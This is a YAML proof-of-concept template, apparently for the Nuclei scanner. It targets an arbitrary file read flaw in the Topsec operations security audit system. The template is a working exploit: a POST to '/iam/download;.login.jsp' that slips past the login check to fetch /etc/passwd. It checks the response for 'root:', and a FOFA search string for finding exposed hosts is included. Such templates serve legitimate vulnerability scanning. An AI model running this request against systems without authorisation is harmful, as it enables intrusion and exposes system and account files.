id: poc-yaml-topsec-topsag-download-anyfile-read
info:
  name: 天融信运维安全审计系统 download 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
  metadata:
    finger: 天融信运维安全审计系统
    fofa: header="iam" && server="Apache-Coyote/"
http:
  - method: POST
    path:
      - "/iam/download;.login.jsp"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "filename=1.txt&filepath=/etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:"
          - "/bin"
      - type: word
        part: header
        words:
          - "filename=1.txt"
      - type: word
        part: body
        words:
          - "<"
        negative: true
